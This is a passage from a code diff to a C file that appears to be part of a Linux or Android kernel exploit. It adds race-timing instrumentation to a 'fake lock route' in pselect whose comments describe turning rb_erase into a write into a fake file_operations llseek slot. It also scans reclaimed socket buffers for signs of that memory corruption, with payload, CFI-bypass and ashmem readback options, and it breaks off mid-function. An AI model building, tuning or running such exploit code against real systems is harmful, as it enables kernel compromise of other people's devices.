@@ -1,6 +1,53 @@
 #include "common.h"
 
-#if defined(APP_PAYLOAD) && APP_PAYLOAD
+#if defined(RMG_DIAG_PASSIVE_COW_OBSERVER) && RMG_DIAG_PASSIVE_COW_OBSERVER
+#if !defined(RMG_DIAG_COW_TRACE) || !RMG_DIAG_COW_TRACE || \
+    ((!defined(RMG_DIAG_COW_ONLY) || !RMG_DIAG_COW_ONLY) && \
+     (!defined(RMG_DIAG_PI_PROBE_ONLY) || !RMG_DIAG_PI_PROBE_ONLY || \
+      !defined(RMG_DIAG_UCLAMP_TRIGGER_ONLY) || \
+      !RMG_DIAG_UCLAMP_TRIGGER_ONLY))
+#error "passive COW observer requires COW_TRACE and COW_ONLY or guarded PI uclamp mode"
+#endif
+#endif
+
+#if defined(RMG_DIAG_PI_HELPER_STATE_TRACE) && \
+    RMG_DIAG_PI_HELPER_STATE_TRACE
+#if !defined(RMG_DIAG_PI_PROBE_ONLY) || !RMG_DIAG_PI_PROBE_ONLY || \
+    !defined(RMG_DIAG_UCLAMP_TRIGGER_ONLY) || \
+    !RMG_DIAG_UCLAMP_TRIGGER_ONLY || \
+    !defined(RMG_DIAG_PASSIVE_COW_OBSERVER) || \
+    !RMG_DIAG_PASSIVE_COW_OBSERVER || \
+    !defined(RMG_DIAG_COW_TRACE) || !RMG_DIAG_COW_TRACE
+#error "PI helper state trace requires passive guarded PI/uclamp tracing"
+#endif
+#define RMG_DIAG_PI_HELPER_STATE_TRACE_ACTIVE 1
+#endif
+
+#if (defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY) || \
+    (defined(RMG_DIAG_PASSIVE_COW_OBSERVER) && \
+     RMG_DIAG_PASSIVE_COW_OBSERVER)
+#define RMG_DIAG_READINESS_STATE_TRACE 1
+#endif
+
+#if defined(RMG_DIAG_COW_MPROTECT_DELAY_USEC) && \
+    RMG_DIAG_COW_MPROTECT_DELAY_USEC > 0
+#if !defined(RMG_DIAG_COW_ONLY) || !RMG_DIAG_COW_ONLY || \
+    !defined(RMG_DIAG_COW_TRACE) || !RMG_DIAG_COW_TRACE || \
+    !defined(RMG_DIAG_PASSIVE_COW_OBSERVER) || \
+    !RMG_DIAG_PASSIVE_COW_OBSERVER
+#error "COW mprotect delay requires the passive COW-only observer"
+#endif
+#if RMG_DIAG_COW_MPROTECT_DELAY_USEC > 1000000
+#error "COW mprotect delay must not exceed one second"
+#endif
+#endif
+
+#if ((defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY) || \
+     (defined(RMG_DIAG_PI_PROBE_ONLY) && RMG_DIAG_PI_PROBE_ONLY) || \
+     (defined(RMG_DIAG_CFI_ONLY) && RMG_DIAG_CFI_ONLY)) && \
+    defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
+#define PSELECT_CFI_ROUTE_ATTEMPTS 1
+#elif defined(APP_PAYLOAD) && APP_PAYLOAD
 #define PSELECT_CFI_ROUTE_ATTEMPTS 4
 #else
 #define PSELECT_CFI_ROUTE_ATTEMPTS 1
@@ -27,6 +74,10 @@ uint64_t slide_bootid_before;
 uint64_t slide_bootid_after;
 uint64_t slide_bootid_want;
 ssize_t slide_bootid_restore_ret = -1;
+
+#if defined(RMG_DIAG_FOPS_READBACK_ONLY) && RMG_DIAG_FOPS_READBACK_ONLY
+static int try_ashmem_fops_readback(void);
+#endif
 
 static int route_delay_usec(int attempt) {
   const char *forced = getenv("PSELECT_DELAY_USEC");
@@ -291,17 +342,19 @@ static void route_spin_userspace(void) {
  *        .rb_root gets the write target (canon_addr), .rb_leftmost gets
  *        &W->pi_tree_entry; rb_erase's rb_change_child also stores the
  *        target into the fake fops' llseek slot.
- * Unmodified words (fake_w0 / 0 / 0) mean the walk never reached [7]. */
-static void route_payload_canary(void) {
+ * The initial roots are fake_w0 for lock A, fake_w0+0x100 for lock B when
+ * dual-lock scanning is enabled, and zero for the fake task's PI tree. */
+static int route_payload_canary(void) {
   int fd = reclaim_receiver_fd();
   if (fd < 0) {
     pr_warning("canary: no reclaim socket\n");
-    return;
+    return 0;
   }
   size_t total = (size_t)SKB_SEND_SIZE * SKB_RECLAIM_SENDS;
   unsigned char *buf = malloc(total);
   if (!buf) {
-    return;
+    pr_warning("canary peek allocation failed bytes=%zu\n", total);
+    return 0;
   }
   errno = 0;
   ssize_t n = recv(fd, buf, total, MSG_DONTWAIT | MSG_PEEK);
@@ -309,9 +362,16 @@ static void route_payload_canary(void) {
   if (n <= 0) {
     pr_warning("canary peek ret=%zd errno=%d\n", n, err);
     free(buf);
-    return;
+    return 0;
   }
+  int mutated = 0;
+  size_t chunks_scanned = 0;
+  size_t changed_chunks = 0;
+  size_t lock_a_changed_chunks = 0;
+  size_t lock_b_changed_chunks = 0;
+  size_t task_pi_changed_chunks = 0;
   for (size_t pos = 0; pos + ORDER3_SIZE <= (size_t)n; pos += ORDER3_SIZE) {
+    chunks_scanned++;
     const unsigned char *c = buf + pos;
     uint64_t lock_root = 0, lock_left = 0, pi_root = 0, pi_left = 0;
     uint64_t owner = 0, llseek = 0, waiter_pc = 0, waiter_right = 0;
@@ -328,13 +388,30 @@ static void route_payload_canary(void) {
     memcpy(&lockb_root, c + LOCK_OFF + 0x108, 8);
     memcpy(&lockb_left, c + LOCK_OFF + 0x110, 8);
     memcpy(&waiterb_pc, c + W0_OFF + 0x100 + FAKE_WAITER_PI_TREE_ENTRY_OFF, 8);
-    if (lock_root == (uint64_t)fake_w0 &&
-        lock_left == (uint64_t)fake_w0 && !pi_root && !pi_left)
+    int lock_a_changed = lock_root != (uint64_t)fake_w0 ||
+                         lock_left != (uint64_t)fake_w0;
+    int lock_b_changed = 0;
+#if defined(PAYLOAD_DUAL_LOCK_SCAN) && PAYLOAD_DUAL_LOCK_SCAN
+    uintptr_t fake_w0_b = fake_w0 + 0x100;
+    lock_b_changed = lockb_root != (uint64_t)fake_w0_b ||
+                     lockb_left != (uint64_t)fake_w0_b;
+#endif
+    int task_pi_changed = pi_root != 0 || pi_left != 0;
+    if (lock_a_changed)
+      lock_a_changed_chunks++;
+    if (lock_b_changed)
+      lock_b_changed_chunks++;
+    if (task_pi_changed)
+      task_pi_changed_chunks++;
+    if (!lock_a_changed && !lock_b_changed && !task_pi_changed)
       continue;
+    mutated = 1;
+    changed_chunks++;
     pr_info("canary MUTATED pos=%#zx lock_root=%016llx lock_left=%016llx "
             "pi_root=%016llx pi_left=%016llx owner=%016llx llseek=%016llx "
             "w0_pi_pc=%016llx w0_pi_right=%016llx "
-            "lockb_root=%016llx lockb_left=%016llx w0b_pi_pc=%016llx\n",
+            "lockb_root=%016llx lockb_left=%016llx w0b_pi_pc=%016llx "
+            "changed_a=%d changed_b=%d changed_task_pi=%d\n",
             pos, (unsigned long long)lock_root,
             (unsigned long long)lock_left, (unsigned long long)pi_root,
             (unsigned long long)pi_left, (unsigned long long)owner,
@@ -343,9 +420,23 @@ static void route_payload_canary(void) {
             (unsigned long long)waiter_right,
             (unsigned long long)lockb_root,
             (unsigned long long)lockb_left,
-            (unsigned long long)waiterb_pc);
+            (unsigned long long)waiterb_pc, lock_a_changed, lock_b_changed,
+            task_pi_changed);
+  }
+  size_t expected_chunks = total / ORDER3_SIZE;
+  pr_info("canary peek bytes=%zd requested=%zu order3_scanned=%zu/%zu "
+          "trailing=%zu changed_chunks=%zu lock_a=%zu lock_b=%zu "
+          "task_pi=%zu mutated=%d\n",
+          n, total, chunks_scanned, expected_chunks,
+          (size_t)n - chunks_scanned * ORDER3_SIZE, changed_chunks,
+          lock_a_changed_chunks, lock_b_changed_chunks,
+          task_pi_changed_chunks, mutated);
+  if ((size_t)n < total) {
+    pr_warning("canary peek incomplete: negative result does not cover "
+               "the full reclaim stream\n");
   }
   free(buf);
+  return mutated;
 }
 
 /* The never-ready fd that keeps the blocked select asleep: an empty
@@ -752,7 +843,7 @@ void do_pselect_fake_lock_route(void) {
     pr_info("route walk attempt=%d/%d calls=%d success=%d walk_us=%d\n",
             route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, calls, success,
             atomic_load(&consumer_walk_us));
-    route_payload_canary();
+    (void)route_payload_canary();
 
     int route_signal = calls > 0 && success > 0;
     if (route_signal) {
@@ -809,16 +900,26 @@ extern long readiness_pselect_asm(int nfds, fd_set *readfds,
 
 #define READINESS_PTE_MB_DEFAULT 2048
 #define READINESS_PTE_MB_MAX 16384
+#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
+#define READINESS_LOCK_HEADSTART_USEC 50
+#else
 #define READINESS_LOCK_HEADSTART_USEC 100
+#endif
 
 struct readiness_cow_ctx {
   void *region;
   size_t region_len;
   atomic_int start;
   atomic_int entered;
+  atomic_int tid;
+  atomic_int abort;
+  atomic_int release_mprotect;
+  atomic_int mprotect_started;
+  atomic_int stop_mprotect;
   atomic_int done;
   int ret;
   int err;
+  unsigned long iterations;
   long long elapsed_us;
 };
 
@@ -827,6 +928,134 @@ static long long readiness_now_us(void) {
   clock_gettime(CLOCK_MONOTONIC, &ts);
   return (long long)ts.tv_sec * 1000000LL + ts.tv_nsec / 1000;
 }
+
+#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
+#define READINESS_TRACE_CAP 16
+#define READINESS_MPROTECT_TRACE_CAP 128
+enum readiness_trace_event {
+  READINESS_TRACE_MPROTECT_BEFORE = 1,
+  READINESS_TRACE_MPROTECT_AFTER,
+  READINESS_TRACE_MONITOR_ARMED,
+  READINESS_TRACE_MONITOR_FIRST_STATE,
+  READINESS_TRACE_MONITOR_BLOCKED,
+  READINESS_TRACE_PSELECT_BEFORE,
+  READINESS_TRACE_PSELECT_AFTER,
+  READINESS_TRACE_COW_ENTERED,
+  READINESS_TRACE_TRIGGER_GATE_OPEN,
+  READINESS_TRACE_POST_GATE_RUNNABLE,
+  READINESS_TRACE_MONITOR_POST_PSELECT,
+};
+
+struct readiness_trace_entry {
+  long long at_us;
+  int event;
+  int value;
+};
+
+static struct readiness_trace_entry readiness_trace[READINESS_TRACE_CAP];
+static atomic_int readiness_trace_count;
+
+struct readiness_mprotect_trace_entry {
+  long long at_us;
+  unsigned long call_index;
+  int entering;
+  int restore;
+  int prot;
+  int ret;
+  int err;
+};
+
+static struct readiness_mprotect_trace_entry
+    readiness_mprotect_trace[READINESS_MPROTECT_TRACE_CAP];
+static atomic_int readiness_mprotect_trace_count;
+
+static void readiness_trace_reset(void) {
+  atomic_store(&readiness_trace_count, 0);
+  atomic_store(&readiness_mprotect_trace_count, 0);
+}
+
+static void readiness_trace_mark(int event, int value) {
+  int slot = atomic_fetch_add(&readiness_trace_count, 1);
+  if (slot < READINESS_TRACE_CAP) {
+    readiness_trace[slot].at_us = readiness_now_us();
+    readiness_trace[slot].event = event;
+    readiness_trace[slot].value = value;
+  }
+}
+
+static void readiness_trace_flush(int route_attempt) {
+  int count = atomic_load(&readiness_trace_count);
+  if (count > READINESS_TRACE_CAP)
+    count = READINESS_TRACE_CAP;
+  for (int i = 0; i < count; i++) {
+    struct readiness_trace_entry entry = readiness_trace[i];
+    pr_info("COWTRACE attempt=%d event=%d at_us=%lld value=%d\n",
+            route_attempt, entry.event, entry.at_us, entry.value);
+  }
+}
+
+static void readiness_mprotect_trace_mark(long long at_us,
+                                           unsigned long call_index,
+                                           int entering, int restore,
+                                           int prot, int ret, int err) {
+  int slot = atomic_fetch_add(&readiness_mprotect_trace_count, 1);
+  if (slot < READINESS_MPROTECT_TRACE_CAP) {
+    struct readiness_mprotect_trace_entry *entry =
+        &readiness_mprotect_trace[slot];
+    entry->at_us = at_us;
+    entry->call_index = call_index;
+    entry->entering = entering;
+    entry->restore = restore;
+    entry->prot = prot;
+    entry->ret = ret;
+    entry->err = err;
+  }
+}
+
+static int readiness_traced_mprotect(void *address, size_t length, int prot,
+                                     unsigned long call_index, int restore,
+                                     int *err_out) {
+  errno = 0;
+  long long entered_us = readiness_now_us();
+  readiness_mprotect_trace_mark(entered_us, call_index, 1, restore, prot, 0,
+                                0);
+  int ret = mprotect(address, length, prot);
+  int err = ret == 0 ? 0 : errno;
+  long long returned_us = readiness_now_us();
+  readiness_mprotect_trace_mark(returned_us, call_index, 0, restore, prot,
+                                ret, err);
+  *err_out = err;
+  return ret;
+}
+
+static void readiness_mprotect_trace_flush(int route_attempt) {
+  int count = atomic_load(&readiness_mprotect_trace_count);
+  int truncated = count > READINESS_MPROTECT_TRACE_CAP;
+  if (truncated)
+    count = READINESS_MPROTECT_TRACE_CAP;
+  pr_info("MPTIME attempt=%d events=%d capacity=%d truncated=%d\n",
+          route_attempt, count, READINESS_MPROTECT_TRACE_CAP, truncated);
+  for (int i = 0; i < count; i++) {
+    struct readiness_mprotect_trace_entry entry =
+        readiness_mprotect_trace[i];
+    pr_info("MPTIME attempt=%d call=%lu phase=%s kind=%s prot=%d ret=%d "
+            "errno=%d at_us=%lld\n",
+            route_attempt, entry.call_index,
+            entry.entering ? "enter" : "return",
+            entry.restore ? "restore" : "loop", entry.prot, entry.ret,
+            entry.err, entry.at_us);
+  }
+}
+
+static void readiness_log_cow_pagemap(const char *phase, int ret, int err,
+                                      unsigned long long entry) {
+  pr_info("readiness COW pagemap phase=%s result=%d errno=%d "
+          "entry=%016llx present=%d file=%d exclusive=%d soft_dirty=%d\n",
+          phase, ret, err, entry, (int)((entry >> 63) & 1ULL),
+          (int)((entry >> 61) & 1ULL), (int)((entry >> 56) & 1ULL),
+          (int)((entry >> 55) & 1ULL));
+}
+#endif
 
 static size_t readiness_pte_mb(void) {
   const char *value = getenv("READINESS_PTE_MB");
@@ -863,21 +1092,223 @@ static int readiness_prepare_pte_region(struct readiness_cow_ctx *ctx) {
   return 1;
 }
 
+#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
+static unsigned long long readiness_affinity_mask64(const cpu_set_t *mask) {
+  unsigned long long bits = 0;
+  for (int cpu = 0; cpu < 64 && cpu < CPU_SETSIZE; cpu++) {
+    if (CPU_ISSET(cpu, mask))
+      bits |= 1ULL << cpu;
+  }
+  return bits;
+}
+#endif
+
+#if defined(RMG_DIAG_PASSIVE_COW_OBSERVER) && RMG_DIAG_PASSIVE_COW_OBSERVER
+static int readiness_select_passive_helper_core(const cpu_set_t *allowed,
+                                                int waiter_core) {
+#if defined(RMG_DIAG_PASSIVE_COW_HELPER_CORE) && \
+    RMG_DIAG_PASSIVE_COW_HELPER_CORE >= 0
+  int preferred = RMG_DIAG_PASSIVE_COW_HELPER_CORE;
+  if (preferred < CPU_SETSIZE && preferred != waiter_core &&
+      CPU_ISSET(preferred, allowed))
+    return preferred;
+#endif
+  for (int cpu = CPU_SETSIZE - 1; cpu >= 0; cpu--) {
+    if (cpu != waiter_core && CPU_ISSET(cpu, allowed))
+      return cpu;
+  }
+  return -1;
+}
+
+static int readiness_pin_passive_observer(
+    int waiter_core, int *observer_core, int *helper_core,
+    unsigned long long *inherited_bits, unsigned long long *allowed_bits,
+    unsigned long long *effective_bits) {
+  cpu_set_t inherited, all_cpus, allowed, requested, effective;
+  CPU_ZERO(&inherited);
+  memset(&all_cpus, 0xff, sizeof(all_cpus));
+  CPU_ZERO(&allowed);
+  CPU_ZERO(&requested);
+  CPU_ZERO(&effective);
+  *observer_core = -1;
+  *helper_core = -1;
+  *inherited_bits = 0;
+  *allowed_bits = 0;
+  *effective_bits = 0;
+
+  if (waiter_core < 0) {
+    errno = EINVAL;
+    return -1;
+  }
+
+  if (sched_getaffinity(0, sizeof(inherited), &inherited) != 0)
+    return -1;
+  *inherited_bits = readiness_affinity_mask64(&inherited);
+
+  /* pthread_create inherited the waiter's CPU-6 mask. Widen only this
+   * monitor thread so we can discover its cpuset, then keep it off both the
+   * waiter and the selected COW mmap helper CPU. */
+  if (sched_setaffinity(0, sizeof(all_cpus), &all_cpus) != 0)
+    return -1;
+  if (sched_getaffinity(0, sizeof(allowed), &allowed) != 0)
+    return -1;
+  *allowed_bits = readiness_affinity_mask64(&allowed);
+
+  *helper_core = readiness_select_passive_helper_core(&allowed,
+                                                       waiter_core);
+  if (*helper_core < 0) {
+    errno = ENODEV;
+    return -1;
+  }
+
+  int last_errno = ENODEV;
+  for (int cpu = 0; cpu < CPU_SETSIZE; cpu++) {
+    if (cpu == waiter_core || cpu == *helper_core ||
+        !CPU_ISSET(cpu, &allowed))
+      continue;
+    CPU_ZERO(&requested);
+    CPU_SET(cpu, &requested);
+    if (sched_setaffinity(0, sizeof(requested), &requested) != 0) {
+      last_errno = errno;
+      continue;
+    }
+    if (sched_getaffinity(0, sizeof(effective), &effective) != 0) {
+      last_errno = errno;
+      continue;
+    }
+    int effective_count = 0;
+    for (int check = 0; check < CPU_SETSIZE; check++)
+      effective_count += CPU_ISSET(check, &effective) ? 1 : 0;
+    if (effective_count == 1 && CPU_ISSET(cpu, &effective) &&
+        sched_getcpu() == cpu) {
+      *observer_core = cpu;
+      *effective_bits = readiness_affinity_mask64(&effective);
+      return 0;
+    }
+    last_errno = EINVAL;
+  }
+  errno = last_errno;
+  return -1;
+}
+#endif
+
 static void *readiness_mmap_lock_thread(void *arg) {
   struct readiness_cow_ctx *ctx = arg;
   disable_rseq_for_thread();
+  atomic_store_explicit(&ctx->tid, (int)syscall(SYS_gettid),
+                        memory_order_release);
+#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
+  int waiter_core = atomic_load(&route_waiter_core);
+  cpu_set_t inherited_mask, restore_mask, restored_mask;
+  memset(&inherited_mask, 0, sizeof(inherited_mask));
+  memset(&restore_mask, 0xff, sizeof(restore_mask));
+  memset(&restored_mask, 0, sizeof(restored_mask));
+  int inherited_ret = sched_getaffinity(0, sizeof(inherited_mask),
+                                        &inherited_mask);
+  int inherited_errno = inherited_ret == 0 ? 0 : errno;
+  errno = 0;
+  int restore_ret = sched_setaffinity(0, sizeof(restore_mask),
+                                      &restore_mask);
+  int restore_errno = restore_ret == 0 ? 0 : errno;
+  int restored_ret = sched_getaffinity(0, sizeof(restored_mask),
+                                       &restored_mask);
+  unsigned long long restored_bits = restored_ret == 0
+      ? readiness_affinity_mask64(&restored_mask) : 0;
+  int locker_core = -1;
+  if (restore_ret == 0) {
+#if defined(RMG_DIAG_PASSIVE_COW_OBSERVER) && \
+    RMG_DIAG_PASSIVE_COW_OBSERVER
+    cpu_set_t allowed_mask;
+    CPU_ZERO(&allowed_mask);
+    if (sched_getaffinity(0, sizeof(allowed_mask), &allowed_mask) == 0) {
+      int preferred_core = readiness_select_passive_helper_core(
+          &allowed_mask, waiter_core);
+      if (preferred_core >= 0 && sched_pin_core(preferred_core) == 0)
+        locker_core = preferred_core;
+    }
+#endif
+    if (locker_core < 0)
+      locker_core = sched_pin_highest_allowed(waiter_core);
+  }
+  pr_info("readiness mmap locker affinity inherited=%016llx/%d "
+          "restore=%d/%d allowed=%016llx/%d core=%d waiter_core=%d\n",
+          inherited_ret == 0
+              ? readiness_affinity_mask64(&inherited_mask) : 0,
+          inherited_errno, restore_ret, restore_errno, restored_bits,
+          restored_ret, locker_core, waiter_core);
+#else
   pin_to_core_ex(CORE > 0 ? CORE - 1 : CORE,
                  atomic_load(&route_waiter_core));
+#endif
 
   while (!atomic_load_explicit(&ctx->start, memory_order_acquire))
     __asm__ volatile("yield" ::: "memory");
 
   atomic_store_explicit(&ctx->entered, 1, memory_order_release);
+  if (atomic_load_explicit(&ctx->abort, memory_order_acquire))
+    return NULL;
+#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
+  while (!atomic_load_explicit(&ctx->release_mprotect,
+                               memory_order_acquire))
+    __asm__ volatile("yield" ::: "memory");
+#if defined(RMG_DIAG_COW_MPROTECT_DELAY_USEC) && \
+    RMG_DIAG_COW_MPROTECT_DELAY_USEC > 0
+  long long release_us = readiness_now_us();
+  long long delay_until_us =
+      release_us + RMG_DIAG_COW_MPROTECT_DELAY_USEC;
+  while (readiness_now_us() < delay_until_us)
+    __asm__ volatile("yield" ::: "memory");
+#endif
+#endif
   long long start_us = readiness_now_us();
   errno = 0;
+#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
+  readiness_trace_mark(READINESS_TRACE_MPROTECT_BEFORE, 0);
+  atomic_store_explicit(&ctx->mprotect_started, 1, memory_order_release);
+#endif
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("readiness-mprotect-start", ctx->region_len,
+                      syscall(SYS_gettid));
+#endif
+#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
+  unsigned long mprotect_call_index = 0;
+  int prot = PROT_READ;
+  ctx->ret = 0;
+  ctx->err = 0;
+  do {
+    prot = prot == PROT_READ ? PROT_NONE : PROT_READ;
+    ctx->ret = readiness_traced_mprotect(
+        ctx->region, ctx->region_len, prot, ++mprotect_call_index, 0,
+        &ctx->err);
+    if (ctx->ret != 0)
+      break;
+    ctx->iterations++;
+  } while (!atomic_load_explicit(&ctx->stop_mprotect,
+                                 memory_order_acquire));
+  /* Leave the private diagnostic mapping readable before it is unmapped. */
+  if (ctx->ret == 0 && prot == PROT_NONE) {
+    ctx->ret = readiness_traced_mprotect(
+        ctx->region, ctx->region_len, PROT_READ, ++mprotect_call_index, 1,
+        &ctx->err);
+  }
+#else
   ctx->ret = mprotect(ctx->region, ctx->region_len, PROT_NONE);
   ctx->err = errno;
+#endif
   ctx->elapsed_us = readiness_now_us() - start_us;
+#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
+  readiness_trace_mark(READINESS_TRACE_MPROTECT_AFTER, ctx->ret);
+#endif
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("readiness-mprotect-done",
+                      (unsigned long long)ctx->ret, ctx->err);
+  rmg_diag_checkpoint("readiness-mprotect-time",
+                      (unsigned long long)ctx->elapsed_us,
+                      ctx->region_len);
+#endif
+  pr_info("readiness mmap locker result=%d errno=%d iterations=%lu "
+          "elapsed_us=%lld\n", ctx->ret, ctx->err, ctx->iterations,
+          ctx->elapsed_us);
   atomic_store_explicit(&ctx->done, 1, memory_order_release);
   return NULL;
 }
@@ -910,16 +1341,260 @@ static fd_set *readiness_map_cow_fdset(const fd_set *source, int *fd_out,
   return mapping;
 }
 
+#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
+static int readiness_clear_soft_dirty(void) {
+  int fd = open("/proc/self/clear_refs", O_WRONLY | O_CLOEXEC);
+  if (fd < 0)
+    return -1;
+  ssize_t written = write(fd, "4", 1);
+  int saved_errno = errno;
+  close(fd);
+  if (written != 1) {
+    errno = written < 0 ? saved_errno : EIO;
+    return -1;
+  }
+  return 0;
+}
+
+static int readiness_read_pagemap_entry(const void *address,
+                                        unsigned long long *entry_out) {
+  size_t page_size = (size_t)sysconf(_SC_PAGESIZE);
+  if (!page_size) {
+    errno = EINVAL;
+    return -1;
+  }
+  int fd = open("/proc/self/pagemap", O_RDONLY | O_CLOEXEC);
+  if (fd < 0)
+    return -1;
+  off_t offset = (off_t)((uintptr_t)address / page_size) *
+                 (off_t)sizeof(*entry_out);
+  unsigned long long entry = 0;
+  ssize_t got = pread(fd, &entry, sizeof(entry), offset);
+  int saved_errno = errno;
+  close(fd);
+  if (got != (ssize_t)sizeof(entry)) {
+    errno = got < 0 ? saved_errno : EIO;
+    return -1;
+  }
+  *entry_out = entry;
+  return 0;
+}
+
+struct readiness_smaps_snapshot {
+  int ret;
+  int err;
+  unsigned long long anonymous_kb;
+  unsigned long long private_dirty_kb;
+};
+
+static void readiness_read_smaps(const void *address,
+                                 struct readiness_smaps_snapshot *snapshot) {
+  snapshot->ret = -1;
+  snapshot->err = 0;
+  int fd = open("/proc/self/smaps", O_RDONLY | O_CLOEXEC);
+  if (fd < 0) {
+    snapshot->err = errno;
+    return;
+  }
+  FILE *smaps = fdopen(fd, "r");
+  if (!smaps) {
+    snapshot->err = errno;
+    close(fd);
+    return;
+  }
+
+  uintptr_t target = (uintptr_t)address;
+  int in_target_vma = 0;
+  int saw_anonymous = 0;
+  int saw_private_dirty = 0;
+  char line[256];
+  while (fgets(line, sizeof(line), smaps)) {
+    unsigned long long start = 0, end = 0;
+    if (sscanf(line, "%llx-%llx", &start, &end) == 2) {
+      if (in_target_vma)
+        break;
+      in_target_vma = target >= (uintptr_t)start &&
+                      target < (uintptr_t)end;
+      continue;
+    }
+    if (!in_target_vma)
+      continue;
+
+    unsigned long long value = 0;
+    if (sscanf(line, "Anonymous: %llu kB", &value) == 1) {
+      snapshot->anonymous_kb = value;
+      saw_anonymous = 1;
+    } else if (sscanf(line, "Private_Dirty: %llu kB", &value) == 1) {
+      snapshot->private_dirty_kb = value;
+      saw_private_dirty = 1;
+    }
+    if (saw_anonymous && saw_private_dirty) {
+      snapshot->ret = 0;
+      break;
+    }
+  }
+  if (snapshot->ret != 0)
+    snapshot->err = ferror(smaps) ? errno : ENODATA;
+  fclose(smaps);
+}
+
+struct readiness_anon_soft_dirty_probe {
+  int map_ret;
+  int map_errno;
+  int clear_ret;
+  int clear_errno;
+  int before_ret;
+  int before_errno;
+  unsigned long long before_entry;
+  int write_ret;
+  int after_ret;
+  int after_errno;
+  unsigned long long after_entry;
+};
+
+static void readiness_probe_anon_soft_dirty(
+    struct readiness_anon_soft_dirty_probe *probe) {
+  probe->map_ret = -1;
+  probe->clear_ret = -1;
+  probe->before_ret = -1;
+  probe->write_ret = -1;
+  probe->after_ret = -1;
+  size_t page_size = (size_t)sysconf(_SC_PAGESIZE);
+  if (!page_size) {
+    probe->map_errno = EINVAL;
+    return;
+  }
+
+  volatile unsigned char *page = mmap(NULL, page_size,
+      PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+  if (page == MAP_FAILED) {
+    probe->map_errno = errno;
+    return;
+  }
+  probe->map_ret = 0;
+
+  /* Fault in the page before clearing soft-dirty, then test a known write. */
+  *page = 0x41;
+  __asm__ volatile("" : : "r"(*page) : "memory");
+  errno = 0;
+  probe->clear_ret = readiness_clear_soft_dirty();
+  probe->clear_errno = probe->clear_ret == 0 ? 0 : errno;
+  errno = 0;
+  probe->before_ret = readiness_read_pagemap_entry(
+      (const void *)page, &probe->before_entry);
+  probe->before_errno = probe->before_ret == 0 ? 0 : errno;
+
+  *page = 0x42;
+  probe->write_ret = 0;
+  errno = 0;
+  probe->after_ret = readiness_read_pagemap_entry(
+      (const void *)page, &probe->after_entry);
+  probe->after_errno = probe->after_ret == 0 ? 0 : errno;
+  munmap((void *)page, page_size);
+}
+#endif
+
+#if defined(RMG_DIAG_READINESS_STATE_TRACE)
+#define READINESS_MONITOR_STATE_TRACE_CAP 32
+struct readiness_monitor_state_event {
+  long long at_us;
+  unsigned long long polls;
+  int tid;
+  int target;
+  int state;
+  int gate;
+  int pselect_active;
+  int observer_cpu;
+};
+#endif
+
 struct readiness_block_monitor {
   int tid;
   int seq;
   atomic_int ready;
   atomic_int armed;
+  atomic_int trigger_gate;
+  atomic_int runnable_after_gate;
+  atomic_int pselect_active;
+  atomic_int pre_gate_block;
+  atomic_int sample_ready;
   atomic_int stop;
   atomic_int saw_block;
   int open_errno;
   long sched_ret;
   int sched_errno;
+  unsigned long long polls;
+  unsigned long long blocked_samples;
+  int post_pselect_block;
+  unsigned long long post_pselect_block_polls;
+  int first_state;
+  int last_state;
+#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
+  atomic_int locker_tid;
+  atomic_int locker_stat_ready;
+  int locker_stat_fd;
+  int locker_open_errno;
+  unsigned long long locker_polls;
+  unsigned long long locker_blocked_samples;
+  int locker_first_state;
+  int locker_last_state;
+  int locker_block_seen;
+  int locker_block_state;
+  int locker_block_gate;
+  int locker_block_pselect_active;
+  int locker_block_wchan_errno;
+  unsigned long long locker_block_polls;
+  long long locker_block_at_us;
+  char locker_block_wchan[128];
+#endif
+#if defined(RMG_DIAG_PI_HELPER_STATE_TRACE_ACTIVE)
+  atomic_int helper_stat_ready;
+  int helper_tid;
+  int helper_stat_fd;
+  int helper_open_errno;
+  unsigned long long helper_polls;
+  unsigned long long helper_blocked_samples;
+  int helper_first_state;
+  int helper_last_state;
+#endif
+#if defined(RMG_DIAG_PASSIVE_COW_OBSERVER) && RMG_DIAG_PASSIVE_COW_OBSERVER
+  int observer_affinity_errno;
+  int observer_core;
+  int helper_core;
+  unsigned long long observer_inherited_affinity;
+  unsigned long long observer_allowed_affinity;
+  unsigned long long observer_effective_affinity;
+  unsigned long long pselect_state_samples;
+  int pselect_first_state;
+  int pselect_last_state;
+  long long pselect_first_sample_us;
+  long long pselect_last_sample_us;
+  int pselect_first_observer_cpu;
+  int pselect_last_observer_cpu;
+#endif
+#if defined(RMG_DIAG_READINESS_STATE_TRACE)
+  struct readiness_monitor_state_event
+      state_trace[READINESS_MONITOR_STATE_TRACE_CAP];
+  atomic_int state_trace_count;
+#endif
+#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
+  int block_seen;
+  int block_state;
+  int block_gate;
+  int block_runnable_after_gate;
+  int block_pselect_started;
+  int block_pselect_active_at_state;
+  int block_pselect_active_after_state;
+  int block_pselect_active_after_wchan;
+  int block_wchan_errno;
+  int block_wchan_state_after;
+  long long block_wchan_elapsed_us;
+  unsigned long long block_polls;
+  long long block_at_us;
+  unsigned long long runnable_after_gate_polls;
+  char block_wchan[128];
+  atomic_int pselect_call_started;
+#endif
 };
 
 static char readiness_task_state(int fd) {
@@ -934,55 +1609,727 @@ static char readiness_task_state(int fd) {
   return rparen[2];
 }
 
+static int readiness_open_task_stat(pid_t tid) {
+  char path[64];
